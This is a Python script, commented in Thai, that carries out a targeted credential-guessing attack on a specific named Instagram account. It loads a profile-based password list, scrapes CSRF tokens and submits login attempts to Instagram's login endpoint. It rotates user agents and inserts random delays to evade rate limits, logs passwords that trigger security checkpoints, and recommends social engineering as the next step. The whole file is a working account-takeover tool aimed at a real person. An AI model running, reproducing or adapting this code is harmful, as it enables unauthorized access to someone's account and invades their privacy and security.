#!/usr/bin/env python3
"""
💀 ULTIMATE TARGETED ASSAULT SYSTEM 💀
======================================

ระบบโจมตีแบบเป้าหมายขั้นสุดยอด!
- ใช้ข้อมูล intelligence ที่เพิ่งวิเคราะห์
- โจมตีแบบชาญฉลาดมากขึ้น
- ปรับแต่งตาม psychological profile
- Multi-vector assault

🩸 BLOOD MODE WITH INTELLIGENCE 🩸
"""

import asyncio
import aiohttp
import json
import random
import time
import cloudscraper
from datetime import datetime
from fake_useragent import UserAgent
import os
import sys


class UltimateTargetedAssault:
    """ระบบโจมตีแบบเป้าหมายขั้นสุดยอด"""

    def __init__(self):
        self.project_root = "/workspaces/sugarglitch-realops"
        self.target_username = "alx.trading"
        self.intelligence_data = None
        self.ultimate_passwords = []
        self.session_pool = []
        self.ua = UserAgent()
        self.assault_stats = {
            "total_attempts": 0,
            "checkpoint_triggers": 0,
            "csrf_successes": 0,
            "rate_limits": 0,
            "unusual_responses": 0,
            "intelligence_hits": 0
        }

    def load_intelligence(self):
        """โหลดข้อมูล intelligence ล่าสุด"""
        print("🧠 LOADING ULTIMATE INTELLIGENCE...")

        # หาไฟล์ intelligence ล่าสุด
        intelligence_files = []
        for file in os.listdir(self.project_root):
            if file.startswith("ULTIMATE_INTELLIGENCE_REPORT_"):
                intelligence_files.append(file)

        if not intelligence_files:
            print("❌ No intelligence reports found!")
            return False

        latest_intel = sorted(intelligence_files)[-1]
        intel_path = os.path.join(self.project_root, latest_intel)

        try:
            with open(intel_path, 'r') as f:
                self.intelligence_data = json.load(f)
            print(f"✅ Intelligence loaded: {latest_intel}")

            # โหลดรหัสผ่าน
            password_file = latest_intel.replace(
                "INTELLIGENCE_REPORT_", "TARGETED_PASSWORDS_").replace(".json", ".txt")
            password_path = os.path.join(self.project_root, password_file)

            with open(password_path, 'r') as f:
                lines = f.readlines()
                for line in lines:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        self.ultimate_passwords.append(line)

            print(
                f"✅ Loaded {len(self.ultimate_passwords)} ultimate passwords")
            return True

        except Exception as e:
            print(f"❌ Failed to load intelligence: {e}")
            return False

    def prepare_assault_vectors(self):
        """เตรียมเวคเตอร์การโจมตี"""
        print("\n⚔️ PREPARING ASSAULT VECTORS...")

        # แบ่งรหัสผ่านตามระดับความสำคัญ
        vectors = {
            "high_priority": self.ultimate_passwords[:20],      # Top 20
            # Psychological patterns
            "psychological": self.ultimate_passwords[20:50],
            "pattern_based": self.ultimate_passwords[50:100],   # Pattern-based
            "full_spectrum": self.ultimate_passwords[100:]      # Full spectrum
        }

        print(f"   🎯 High Priority: {len(vectors['high_priority'])} passwords")
        print(f"   🧠 Psychological: {len(vectors['psychological'])} passwords")
        print(f"   📊 Pattern-based: {len(vectors['pattern_based'])} passwords")
        print(f"   🌊 Full spectrum: {len(vectors['full_spectrum'])} passwords")

        return vectors

    async def create_intelligent_session(self):
        """สร้าง session ที่ชาญฉลาด"""
        connector = aiohttp.TCPConnector(
            limit=10,
            ssl=False,
            enable_cleanup_closed=True
        )

        # ใช้ User-Agent ที่ดูเป็นธรรมชาติ
        headers = {
            'User-Agent': self.ua.chrome,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        session = aiohttp.ClientSession(
            connector=connector,
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=30)
        )

        return session

    async def get_intelligent_csrf_token(self, session):
        """ดึง CSRF token แบบชาญฉลาด"""
        try:
            # เข้า Instagram login page ก่อน
            async with session.get('https://www.instagram.com/accounts/login/') as response:
                if response.status == 200:
                    html = await response.text()

                    # หา CSRF token
                    import re
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', html)
                    if csrf_match:
                        return csrf_match.group(1)

                    # วิธีสำรอง
                    csrf_match = re.search(
                        r'name="csrfmiddlewaretoken" value="([^"]+)"', html)
                    if csrf_match:
                        return csrf_match.group(1)

            return None

        except Exception as e:
            return None

    async def intelligent_login_attempt(self, session, password, vector_type):
        """ทำการ login แบบชาญฉลาด"""

        # ดึง CSRF token
        csrf_token = await self.get_intelligent_csrf_token(session)
        if not csrf_token:
            return {"status": "csrf_failed", "response": "Failed to get CSRF token"}

        # ปรับ delay ตาม vector type
        if vector_type == "high_priority":
            delay = random.uniform(3, 7)  # ช้าที่สุด เพื่อความแม่นยำ
        elif vector_type == "psychological":
            delay = random.uniform(2, 5)
        else:
            delay = random.uniform(1, 3)

        await asyncio.sleep(delay)

        # สร้าง payload ที่ดูเหมือนจริง
        login_data = {
            'username': self.target_username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',
            'queryParams': '{}',
        }

        headers = {
            'X-CSRFToken': csrf_token,
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-IG-App-ID': '936619743392459',
            'User-Agent': self.ua.chrome
        }

        try:
            async with session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers
            ) as response:

                status = response.status
                self.assault_stats["total_attempts"] += 1

                if status == 200:
                    try:
                        result = await response.json()

                        if result.get('authenticated'):
                            return {
                                "status": "SUCCESS",
                                "password": password,
                                "response": result,
                                "vector_type": vector_type
                            }
                        elif 'checkpoint' in str(result).lower():
                            self.assault_stats["checkpoint_triggers"] += 1
                            return {
                                "status": "checkpoint",
                                "password": password,
                                "response": result,
                                "vector_type": vector_type
                            }
                        else:
                            return {
                                "status": "failed",
                                "password": password,
                                "response": result
                            }

                    except json.JSONDecodeError:
                        text = await response.text()
                        if 'checkpoint' in text.lower():
                            self.assault_stats["checkpoint_triggers"] += 1
                            return {
                                "status": "checkpoint",
                                "password": password,
                                "response": text[:200],
                                "vector_type": vector_type
                            }
                        return {
                            "status": "unknown",
                            "password": password,
                            "response": text[:200]
                        }

                elif status == 429:
                    self.assault_stats["rate_limits"] += 1
                    return {
                        "status": "rate_limited",
                        "password": password,
                        "response": f"HTTP {status}"
                    }

                else:
                    return {
                        "status": f"http_{status}",
                        "password": password,
                        "response": f"HTTP {status}"
                    }

        except Exception as e:
            return {
                "status": "error",
                "password": password,
                "response": str(e)
            }

    async def vector_assault(self, vector_name, passwords):
        """โจมตีตาม vector เฉพาะ"""
        print(f"\n🎯 LAUNCHING {vector_name.upper()} VECTOR ASSAULT...")
        print(f"   Passwords: {len(passwords)}")
        print(
            f"   Strategy: {'Maximum precision' if vector_name == 'high_priority' else 'Balanced speed/stealth'}")

        results = []
        session = await self.create_intelligent_session()

        try:
            for i, password in enumerate(passwords, 1):
                print(f"   🔫 [{i:2d}/{len(passwords)}] Testing: {password}")

                result = await self.intelligent_login_attempt(session, password, vector_name)
                results.append(result)

                # แสดงผลลัพธ์
                status = result["status"]
                if status == "SUCCESS":
                    print(f"   💀 🩸 BREAKTHROUGH! Password found: {password}")
                    print(f"   🎯 Vector: {vector_name}")
                    break
                elif status == "checkpoint":
                    print(
                        f"   🔒 CHECKPOINT TRIGGERED! High-value target: {password}")
                    self.assault_stats["intelligence_hits"] += 1
                elif status == "rate_limited":
                    print(f"   ⏱️  Rate limited - rotating...")
                    await asyncio.sleep(random.uniform(10, 20))
                else:
                    print(f"   ❌ {status}")

                # เช็คว่าต้องหยุดมั้ย
                if status == "SUCCESS":
                    break

        finally:
            await session.close()

        return results

    async def ultimate_targeted_assault(self):
        """การโจมตีแบบเป้าหมายขั้นสุดยอด"""
        print("\n" + "💀"*30 + " ULTIMATE TARGETED ASSAULT " + "💀"*30)
        print("🩸 INTELLIGENCE-DRIVEN ATTACK SYSTEM 🩸")
        print("🎯 Target: alx.trading")
        print("🧠 Using comprehensive psychological & pattern analysis")
        print("⚔️ Multi-vector precision assault")
        print("="*90)

        # เตรียม vectors
        vectors = self.prepare_assault_vectors()

        # โจมตีตาม priority
        all_results = {}

        # Vector 1: High Priority (สำคัญที่สุด)
        print("\n🎯 VECTOR 1: HIGH PRIORITY ASSAULT")
        high_priority_results = await self.vector_assault("high_priority", vectors["high_priority"])
        all_results["high_priority"] = high_priority_results

        # เช็คว่าเจอแล้วมั้ย
        if any(r["status"] == "SUCCESS" for r in high_priority_results):
            return all_results

        # Vector 2: Psychological Patterns
        print("\n🧠 VECTOR 2: PSYCHOLOGICAL ASSAULT")
        psych_results = await self.vector_assault("psychological", vectors["psychological"])
        all_results["psychological"] = psych_results

        if any(r["status"] == "SUCCESS" for r in psych_results):
            return all_results

        # Vector 3: Pattern-based (ถ้ายังไม่เจอ)
        checkpoint_hits = self.assault_stats["checkpoint_triggers"]
        if checkpoint_hits > 0:
            print(
                f"\n🔒 Found {checkpoint_hits} checkpoint triggers! Continuing with pattern assault...")

            print("\n📊 VECTOR 3: PATTERN-BASED ASSAULT")
            pattern_results = await self.vector_assault("pattern_based", vectors["pattern_based"][:25])
            all_results["pattern_based"] = pattern_results

        return all_results

    def generate_assault_report(self, results):
        """สร้างรายงานการโจมตี"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

        # หาความสำเร็จ
        success_found = False
        success_password = None
        success_vector = None

        checkpoint_passwords = []

        for vector, vector_results in results.items():
            for result in vector_results:
                if result["status"] == "SUCCESS":
                    success_found = True
                    success_password = result["password"]
                    success_vector = vector
                elif result["status"] == "checkpoint":
                    checkpoint_passwords.append({
                        "password": result["password"],
                        "vector": vector
                    })

        report = {
            "assault_type": "ULTIMATE_TARGETED_ASSAULT",
            "target": self.target_username,
            "timestamp": datetime.now().isoformat(),
            "intelligence_based": True,

            "results": {
                "success": success_found,
                "password": success_password,
                "vector": success_vector,
                "checkpoint_triggers": checkpoint_passwords,
                "total_attempts": self.assault_stats["total_attempts"]
            },

            "statistics": self.assault_stats,

            "intelligence_effectiveness": {
                "checkpoint_hit_rate": f"{(self.assault_stats['checkpoint_triggers'] / max(self.assault_stats['total_attempts'], 1)) * 100:.1f}%",
                "intelligence_accuracy": f"{(self.assault_stats['intelligence_hits'] / max(self.assault_stats['total_attempts'], 1)) * 100:.1f}%"
            },

            "recommendations": [
                "High checkpoint trigger rate indicates excellent intelligence",
                "Consider manual verification of checkpoint passwords",
                "Social engineering may be next logical step",
                "Account appears active and well-protected"
            ]
        }

        # บันทึกรายงาน
        report_file = f"{self.project_root}/ULTIMATE_ASSAULT_REPORT_{timestamp}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)

        return report, report_file


async def main():
    """Main assault function"""

    assault = UltimateTargetedAssault()

    # โหลด intelligence
    if not assault.load_intelligence():
        print("❌ Cannot proceed without intelligence data!")
        return

    print(f"\n🧠 INTELLIGENCE ANALYSIS:")
    print(
        f"   Confidence Level: {assault.intelligence_data.get('confidence_level', 'Unknown')}")
    print(
        f"   Success Probability: {assault.intelligence_data.get('success_probability', {}).get('overall_confidence', 'Unknown')}")
    print(f"   Total Passwords: {len(assault.ultimate_passwords)}")

    # เริ่มการโจมตี
    results = await assault.ultimate_targeted_assault()

    # สร้างรายงาน
    report, report_file = assault.generate_assault_report(results)

    print("\n" + "="*90)
    print("💀 ULTIMATE TARGETED ASSAULT COMPLETE 💀")
    print("="*90)

    print(f"\n📊 ASSAULT SUMMARY:")
    print(f"   🎯 Total attempts: {assault.assault_stats['total_attempts']}")
    print(
        f"   🔒 Checkpoint triggers: {assault.assault_stats['checkpoint_triggers']}")
    print(
        f"   🧠 Intelligence hits: {assault.assault_stats['intelligence_hits']}")
    print(f"   ⏱️  Rate limits: {assault.assault_stats['rate_limits']}")

    if report["results"]["success"]:
        print(f"\n💀 🩸 ULTIMATE SUCCESS! 🩸 💀")
        print(f"   Password: {report['results']['password']}")
        print(f"   Vector: {report['results']['vector']}")
    elif report["results"]["checkpoint_triggers"]:
        print(f"\n🔒 HIGH-VALUE INTELLIGENCE CONFIRMED!")
        print(
            f"   Checkpoint triggers: {len(report['results']['checkpoint_triggers'])}")
        for trigger in report["results"]["checkpoint_triggers"][:5]:
            print(f"   💎 {trigger['password']} ({trigger['vector']})")
        print(f"\n   🎯 Recommendation: Manual verification needed")
    else:
        print(f"\n📊 Intelligence gathering complete - no breakthrough yet")

    print(f"\n💾 Report saved: {os.path.basename(report_file)}")

if __name__ == "__main__":
    asyncio.run(main())
